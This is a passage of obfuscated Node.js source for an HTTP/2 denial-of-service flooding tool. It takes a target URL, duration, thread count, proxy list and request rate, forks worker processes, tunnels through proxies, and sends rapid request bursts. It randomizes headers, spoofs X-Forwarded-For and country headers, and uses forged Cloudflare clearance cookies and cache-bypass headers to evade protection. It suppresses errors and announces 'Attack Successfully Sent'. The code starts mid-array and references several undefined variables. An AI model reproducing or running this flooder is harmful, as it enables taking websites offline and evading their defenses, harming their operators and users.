'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel'],
  lang_header = ['en-US,en;q=0.9', 'en-US,en;q=0.8', 'en-US,en;q=0.7', 'en-US,en;q=0.6', 'en-US,en;q=0.5'],
  country = ['A1', 'A2', 'O1', 'AD', 'AE', 'AF', 'AG', 'AI', 'AL', 'AM', 'AO', 'AQ', 'AR', 'AS', 'AT', 'AU', 'AW', 'AX', 'AZ', 'BA', 'BB', 'BD', 'BE', 'BF', 'BG', 'BH', 'BI', 'BJ', 'BL', 'BM', 'BN', 'BO', 'BQ', 'BR', 'BS', 'BT', 'BV', 'BW', 'BY', 'BZ', 'CA', 'CC', 'CD', 'CF', 'CG', 'CH', 'CI', 'CK', 'CL', 'CM', 'CN', 'CO', 'CR', 'CU', 'CV', 'CW', 'CX', 'CY', 'CZ', 'DE', 'DJ', 'DK', 'DM', 'DO', 'DZ', 'EC', 'EE', 'EG', 'EH', 'ER', 'ES', 'ET', 'FI', 'FJ', 'FK', 'FM', 'FO', 'FR', 'GA', 'GB', 'GD', 'GE', 'GF', 'GG', 'GH', 'GI', 'GL', 'GM', 'GN', 'GP', 'GQ', 'GR', 'GS', 'GT', 'GU', 'GW', 'GY', 'HK', 'HM', 'HN', 'HR', 'HT', 'HU', 'ID', 'IE', 'IL', 'IM', 'IN', 'IO', 'IQ', 'IR', 'IS', 'IT', 'JE', 'JM', 'JO', 'JP', 'KE', 'KG', 'KH', 'KI', 'KM', 'KN', 'KP', 'KR', 'KW', 'KY', 'KZ', 'LA', 'LB', 'LC', 'LI', 'LK', 'LR', 'LS', 'LT', 'LU', 'LV', 'LY', 'MA', 'MC', 'MD', 'ME', 'MF', 'MG', 'MH', 'MK', 'ML', 'MM', 'MN', 'MO', 'MP', 'MQ', 'MR', 'MS', 'MT', 'MU', 'MV', 'MW', 'MX', 'MY', 'MZ', 'NA', 'NC', 'NE', 'NF', 'NG', 'NI', 'NL', 'NO', 'NP', 'NR', 'NU', 'NZ', 'OM', 'PA', 'PE', 'PF', 'PG', 'PH', 'PK', 'PL', 'PM', 'PN', 'PR', 'PS', 'PT', 'PW', 'PY', 'QA', 'RE', 'RO', 'RS', 'RU', 'RW', 'SA', 'SB', 'SC', 'SD', 'SE', 'SG', 'SH', 'SI', 'SJ', 'SK', 'SL', 'SM', 'SN', 'SO', 'SR', 'SS', 'ST', 'SV', 'SX', 'SY', 'SZ', 'TC', 'TD', 'TF', 'TG', 'TH', 'TJ', 'TK', 'TL', 'TM', 'TN', 'TO', 'TR', 'TT', 'TV', 'TW', 'TZ', 'UA', 'UG', 'UM', 'US', 'UY', 'UZ', 'VA', 'VC', 'VE', 'VG', 'VI', 'VN', 'VU', 'WF', 'WS', 'YE', 'YT', 'ZA', 'ZM', 'ZW'],
  fetch_mode = ['navigate', 'same-origin', 'no-cors', 'cors'],
  fetch_dest = ['document', 'sharedworker', 'subresource', 'unknown', 'worker'];
encoding_header = ['gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity', '*'];
const sigalgs = ['ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512', 'ecdsa_brainpoolP256r1tls13_sha256', 'ecdsa_brainpoolP384r1tls13_sha384', 'ecdsa_brainpoolP512r1tls13_sha512', 'ecdsa_sha1', 'ed25519', 'ed448', 'ecdsa_sha224', 'rsa_pkcs1_sha1', 'rsa_pss_pss_sha256', 'dsa_sha256', 'dsa_sha384', 'dsa_sha512', 'dsa_sha224', 'dsa_sha1', 'rsa_pss_pss_sha384', 'rsa_pkcs1_sha2240', 'rsa_pss_pss_sha512', 'sm2sig_sm3', 'ecdsa_secp521r1_sha512'];
let concu = sigalgs['join'](':');
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'], ignoreNames = ['RequestError', 'StatusCodeError', ' ', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
  'accept'() {
    for (let _0x4ef48b = accept_header['length'] - 1; _0x4ef48b > 0; _0x4ef48b--) {
      const _0x1f697a = Math['floor'](Math['random']() * (_0x4ef48b + 1));
      [accept_header[_0x4ef48b], accept_header[_0x1f697a]] = [accept_header[_0x1f697a], accept_header[_0x4ef48b]];
    }
    return accept_header[Math['floor'](Math['random']() * accept_header['length'])];
  },
  'lang'() {
    for (let _0x3c9625 = lang_header['length'] - 1; _0x3c9625 > 0; _0x3c9625--) {
      const _0x1deca1 = Math['floor'](Math['random']() * (_0x3c9625 + 1));
      [lang_header[_0x3c9625], lang_header[_0x1deca1]] = [lang_header[_0x1deca1], lang_header[_0x3c9625]];
    }
    return lang_header[Math['floor'](Math['random']() * lang_header['length'])];
  },
  'encoding'() {
    for (let _0x4f517b = encoding_header['length'] - 1; _0x4f517b > 0; _0x4f517b--) {
      const _0x296067 = Math['floor'](Math['random']() * (_0x4f517b + 1));
      [encoding_header[_0x4f517b], encoding_header[_0x296067]] = [encoding_header[_0x296067], encoding_header[_0x4f517b]];
    }
    return encoding_header[Math['floor'](Math['random']() * encoding_header['length'])];
  },
  'controling'() {
    return controle_header[Math['floor'](Math['random']() * controle_header['length'])];
  },
  'cipher'() {
    return cplist[Math['floor'](Math['random']() * cplist['length'])];
  },
  'referers'() {
    for (let _0xa2512b = referer['length'] - 1; _0xa2512b > 0; _0xa2512b--) {
      const _0x41b7d6 = Math['floor'](Math['random']() * (_0xa2512b + 1));
      [referer[_0xa2512b], referer[_0x41b7d6]] = [referer[_0x41b7d6], referer[_0xa2512b]];
    }
    return referer[Math['floor'](Math['random']() * referer['length'])];
  },
  'platforms'() {
    return platform[Math['floor'](Math['random']() * platform['length'])];
  },
  'mode'() {
    return fetch_mode[Math['floor'](Math['random']() * fetch_mode['length'])];
  },
  'dest'() {
    return fetch_dest[Math['floor'](Math['random']() * fetch_dest['length'])];
  },
  'site'() {
    return fetch_site[Math['floor'](Math['random']() * fetch_site['length'])];
  },
  'countrys'() {
    return country[Math['floor'](Math['random']() * country['length'])];
  },
  'type'() {
    return type[Math['floor'](Math['random']() * type['length'])];
  }
};
function spoof() {
  const _0x3d469 = {};
  _0x3d469['length'] = 0x1, _0x3d469['charset'] = '12';
  const _0x494905 = {};
  _0x494905['length'] = 0x1, _0x494905['charset'] = '012345';
  const _0x286646 = {};
  _0x286646['length'] = 0x1, _0x286646['charset'] = '012345';
  const _0x17ca26 = {};
  _0x17ca26['length'] = 0x1, _0x17ca26['charset'] = '12';
  const _0x42a398 = {};
  _0x42a398['length'] = 0x1, _0x42a398['charset'] = '012345';
  const _0xaa7c0 = {};
  _0xaa7c0['length'] = 0x1, _0xaa7c0['charset'] = '012345';
  const _0x1587f0 = {};
  _0x1587f0['length'] = 0x1, _0x1587f0['charset'] = '12';
  const _0x5a5e36 = {};
  _0x5a5e36['length'] = 0x1, _0x5a5e36['charset'] = '012345';
  const _0x4a26ec = {};
  _0x4a26ec['length'] = 0x1, _0x4a26ec['charset'] = '012345';
  const _0x2dd9bd = {};
  _0x2dd9bd['length'] = 0x1, _0x2dd9bd['charset'] = '12';
  const _0x227304 = {};
  _0x227304['length'] = 0x1, _0x227304['charset'] = '012345';
  const _0x533d8a = {};
  _0x533d8a['length'] = 0x1, _0x533d8a['charset'] = '012345';
  return '' + randstr['generate'](_0x3d469) + randstr['generate'](_0x494905) + randstr['generate'](_0x286646) + '.' + randstr['generate'](_0x17ca26) + randstr['generate'](_0x42a398) + randstr['generate'](_0xaa7c0) + '.' + randstr['generate'](_0x1587f0) + randstr['generate'](_0x5a5e36) + randstr['generate'](_0x4a26ec) + '.' + randstr['generate'](_0x2dd9bd) + randstr['generate'](_0x227304) + randstr['generate'](_0x533d8a);
}
function randomByte() {
  let _0x3030bc = new Uint8Array(1);
  window['crypto']['getRandomValues'](_0x3030bc);
  return _0x3030bc[0];
}
function randomIp() {
  let _0x41ac20 = [];
  for (let _0x5a3155 = 0; _0x5a3155 < 4; _0x5a3155++) {
    _0x41ac20['push'](Math['floor'](Math['random']() * 256));
  }
  return _0x41ac20['join']('.');
}
process['on']('uncaughtException', function (_0x4765d6) {
  if (_0x4765d6['code'] && ignoreCodes['includes'](_0x4765d6['code']) || _0x4765d6['name'] && ignoreNames['includes'](_0x4765d6['name'])) return false;
})['on']('unhandledRejection', function (_0x50f825) {
  if (_0x50f825['code'] && ignoreCodes['includes'](_0x50f825['code']) || _0x50f825['name'] && ignoreNames['includes'](_0x50f825['name'])) return false;
})['on']('warning', _0x14872a => {
  if (_0x14872a['code'] && ignoreCodes['includes'](_0x14872a['code']) || _0x14872a['name'] && ignoreNames['includes'](_0x14872a['name'])) return false;
})['setMaxListeners'](0);
function isPrivate(_0x51e917, _0x599bed) {
  if (!_0x51e917) throw new Error('IP address is required');
  (!_0x599bed || !Array['isArray'](_0x599bed)) && (_0x599bed = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']);
  const _0x5cb774 = ipaddr['parse'](_0x51e917);
  for (let _0xf576ce = 0; _0xf576ce < _0x599bed['length']; _0xf576ce++) {
    const _0x355542 = ipaddr['parseCIDR'](_0x599bed[_0xf576ce]);
    if (_0x5cb774['match'](_0x355542)) return true;
  }
  return false;
}
const target = process['argv'][2],
  time = process['argv'][3],
  thread = process['argv'][4],
  proxyFile = process['argv'][5],
  rps = process['argv'][6];
(!target || !time || !thread || !proxyFile || !rps) && (console['error']('[38;2;0;0;255mU[38;2;2;0;252ms[38;2;5;0;249ma[38;2;7;0;247mg[38;2;10;0;244me[38;2;12;0;242m:[38;2;15;0;239m [38;2;17;0;237mn[38;2;20;0;234mo[38;2;22;0;232md[38;2;25;0;229me[38;2;28;0;226m [38;2;30;0;224mr[38;2;33;0;221ma[38;2;35;0;219mw[38;2;38;0;216m-[38;2;40;0;214mh[38;2;43;0;211mt[38;2;45;0;209mt[38;2;48;0;206mp[38;2;51;0;204m [38;2;53;0;201mu[38;2;56;0;198mr[38;2;58;0;196ml[38;2;61;0;193m [38;2;63;0;191mt[38;2;66;0;188mi[38;2;68;0;186mm[38;2;71;0;183me[38;2;73;0;181m [38;2;76;0;178mt[38;2;79;0;175mh[38;2;81;0;173mr[38;2;84;0;170me[38;2;86;0;168ma[38;2;89;0;165md[38;2;91;0;163m [38;2;94;0;160mp[38;2;96;0;158mr[38;2;99;0;155mo[38;2;102;0;153mx[38;2;104;0;150my[38;2;107;0;147m.[38;2;109;0;145mt[38;2;112;0;142mx[38;2;114;0;140mt[38;2;117;0;137m [38;2;119;0;135mr[38;2;122;0;132ma[38;2;124;0;130mt[38;2;127;0;127me[38;2;130;0;124m([38;2;132;0;122m3[38;2;135;0;119m2[38;2;137;0;117m)[0m'), console['log']('[38;2;0;0;255mE[38;2;2;0;252mx[38;2;5;0;249ma[38;2;7;0;247mm[38;2;10;0;244mp[38;2;12;0;242ml[38;2;15;0;239me[38;2;17;0;237m:[38;2;20;0;234m [38;2;22;0;232mn[38;2;25;0;229mo[38;2;28;0;226md[38;2;30;0;224me[38;2;33;0;221m [38;2;35;0;219mr[38;2;38;0;216ma[38;2;40;0;214mw[38;2;43;0;211m-[38;2;45;0;209mh[38;2;48;0;206mt[38;2;51;0;204mt[38;2;53;0;201mp[38;2;56;0;198m [38;2;58;0;196mh[38;2;61;0;193mt[38;2;63;0;191mt[38;2;66;0;188mp[38;2;68;0;186ms[38;2;71;0;183m:[38;2;73;0;181m/[38;2;76;0;178m/[38;2;79;0;175mg[38;2;81;0;173mo[38;2;84;0;170mo[38;2;86;0;168mg[38;2;89;0;165ml[38;2;91;0;163me[38;2;94;0;160m.[38;2;96;0;158mc[38;2;99;0;155mo[38;2;102;0;153mm[38;2;104;0;150m [38;2;107;0;147m6[38;2;109;0;145m0[38;2;112;0;142m [38;2;114;0;140m5[38;2;117;0;137m [38;2;119;0;135mp[38;2;122;0;132mr[38;2;124;0;130mo[38;2;127;0;127mx[38;2;130;0;124my[38;2;132;0;122m.[38;2;135;0;119mt[38;2;137;0;117mx[38;2;140;0;114mt[38;2;142;0;112m [38;2;145;0;109m3[38;2;147;0;107m2[0m'), process['exit'](1));
!/^https?:\/\//i['test'](target) && (console['error']('sent with http:// or https://'), process['exit'](1));
let proxys = [];
try {
  const proxyData = fs['readFileSync'](proxyFile, 'utf-8');
  proxys = proxyData['match'](/\S+/g);
} catch (_0x1cb1cb) {
  console['error']('Error proxy file:', _0x1cb1cb['message']), process['exit'](1);
}
(isNaN(rps) || rps <= 0) && (console['error']('number rps'), process['exit'](1));
const proxyr = () => {
  for (let _0x25bc4c = proxys['length'] - 1; _0x25bc4c > 0; _0x25bc4c--) {
    const _0x4b21c2 = Math['floor'](Math['random']() * (_0x25bc4c + 1));
    [proxys[_0x25bc4c], proxys[_0x4b21c2]] = [proxys[_0x4b21c2], proxys[_0x25bc4c]];
  }
  return proxys[Math['floor'](Math['random']() * proxys['length'])];
};
if (cluster['isMaster']) {
  const currentDate = new Date();
  console['clear'](), console['log']('[38;2;255;255;255mA[38;2;255;244;244mt[38;2;255;234;234mt[38;2;255;224;224ma[38;2;255;214;214mc[38;2;255;204;204mk[38;2;255;193;193m [38;2;255;183;183mS[38;2;255;173;173mu[38;2;255;163;163mc[38;2;255;153;153mc[38;2;255;142;142me[38;2;255;132;132ms[38;2;255;122;122ms[38;2;255;112;112mf[38;2;255;102;102mu[38;2;255;91;91ml[38;2;255;81;81ml[38;2;255;71;71my[38;2;255;61;61m [38;2;255;51;51mS[38;2;255;40;40me[38;2;255;30;30mn[38;2;255;20;20mt[0m');
  const _0x33d2a0 = {};
  _0x33d2a0['length'] = thread;
  for (let _ of Array['from'](_0x33d2a0)) {
    cluster['fork']();
  }
  setTimeout(() => process['exit'](-1), time * 1000);
} else setInterval(flood);
function flood() {
  var _0x4c212d = url['parse'](target);
  const _0x1bf3e4 = uap[Math['floor'](Math['floor'](Math['random']() * uap['length']))];
  var _0x16ddf4 = headerFunc['cipher'](),
    _0x5e8ff1 = proxyr()['split'](':');
  var _0x5e67ed = request['jar'](),
    _0x1164ec = randomIp(),
    _0x478b8a = {
      'Cache-Control': headerFunc['controling'](),
      ':method': 'GET',
      ':authority': _0x4c212d['host'],
      'Accept-Encoding': headerFunc['encoding'](),
      'X-Forwarded-For': _0x1164ec,
      ':scheme': 'https',
      'sec-ch-ua': _0x1bf3e4,
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': headerFunc['platforms'](),
      'User-Agent': _0x1bf3e4,
      'upgrade-insecure-requests': '1',
      'sec-fetch-site': headerFunc['site'](),
      'sec-fetch-dest': headerFunc['dest'](),
      'sec-fetch-mode': headerFunc['mode'](),
      'accept': headerFunc['accept'](),
      'accept-language': headerFunc['lang'](),
      ':path': _0x4c212d['path'],
      'Origin': target,
      'x-access-token': xAuthToken,
      'CF-IPCountry': headerFunc['countrys'](),
      'Referer': headerFunc['referers'](),
      'If-Modified-Since': httpTime,
      'x-requested-with': 'XMLHttpRequest',
      'content-type': headerFunc['type'](),
      'cf-cache-status': 'BYPASS',
      'sec-ch-ua-platform-version': '0.1.0',
      'Cookie': 'cf_clearance=' + cookieValue
    };
  const _0x2bc510 = {};
  _0x2bc510['keepAlive'] = true, _0x2bc510['keepAliveMsecs'] = 0x7a120, _0x2bc510['maxSockets'] = 0xc350, _0x2bc510['maxTotalSockets'] = 0x2710;
  const _0xab8397 = new http['Agent'](_0x2bc510),
    _0x38f69e = {
      'host': _0x5e8ff1[0],
      'agent': _0xab8397,
      'port': _0x5e8ff1[1],
      'method': 'CONNECT',
      'path': _0x4c212d['host'] + ':443',
      'headers': {
        'Host': _0x4c212d['host'],
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive'
      }
    };
  const _0x2b7a16 = http['request'](_0x38f69e, _0x261e4c => {});
  _0x2b7a16['on']('connect', function (_0x5a676f, _0x432b11, _0x25a5c1) {
    const _0x3ded87 = tls['connect']({
      'host': _0x4c212d['host'],
      'ciphers': _0x16ddf4,
      'secureProtocol': ['TLSv1_1_method', 'TLSv1_2_method', 'TLSv1_3_method'],
      'followAllRedirects': true,
      'maxRedirects': 0xa,
      'port': 0x1bb,
      'sigals': concu,
      'secureOptions': crypto['constants']['SSL_OP_NO_RENEGOTIATION'] | crypto['constants']['SSL_OP_NO_TICKET'] | crypto['constants']['SSL_OP_NO_SSLv2'] | crypto['constants']['SSL_OP_NO_SSLv3'] | crypto['constants']['SSL_OP_NO_COMPRESSION'] | crypto['constants']['SSL_OP_NO_RENEGOTIATION'] | crypto['constants']['SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION'] | crypto['constants']['SSL_OP_TLSEXT_PADDING'] | crypto['constants']['SSL_OP_ALL'] | crypto['constants']['SSLcom'],
      'servername': _0x4c212d['host'],
      'echdCurve': 'GREASE:X25519:x25519:P-256:P-384:P-521:X448',
      'secure': true,
      'Compression': false,
      'rejectUnauthorized': false,
      'ALPNProtocols': ['h2', 'http/1.1', 'spdy/3.1'],
      'sessionTimeout': 0x1388,
      'sessionMaxTimeout': 0xea60,
      'socket': _0x432b11,
      'cookie': _0x5e67ed
    }, () => {
      _0x3ded87['setKeepAlive'](true, 6000000);
      const _0x29adad = {};
      _0x29adad['headerTableSize'] = 0x10000, _0x29adad['maxConcurrentStreams'] = 0x3e8, _0x29adad['initialWindowSize'] = 0x600000, _0x29adad['maxHeaderListSize'] = 0x40000, _0x29adad['enablePush'] = false;
      const _0x5d5be7 = {};
      _0x5d5be7['createConnection'] = () => _0x3ded87;
      _0x5d5be7['settings'] = _0x29adad;
      const _0x57d713 = http2['connect'](_0x4c212d['href'], _0x5d5be7);
      _0x57d713['on']('connect', () => {
        const _0x10e09f = setInterval(() => {
          for (let _0x23bfed = 0; _0x23bfed < rps; _0x23bfed++) {
            const _0x22183c = _0x57d713['request'](_0x478b8a)['on']('response', _0xc5215b => {
              _0x22183c['close']();
              _0x22183c['destroy']();
              return;
            });
            _0x22183c['end']();
          }
        }, process['argv'][7]);
      }), _0x57d713['on']('close', () => {
        _0x57d713['destroy']();
        connection['destroy']();
        return;
      });
      _0x57d713['on']('error', _0x329155 => {
        _0x57d713['destroy']();
        connection['destroy']();
        return;
      });
    });
  }), _0x2b7a16['end']();
}
const client = http2['connect'](parsed['href'], clientOptions, function () {});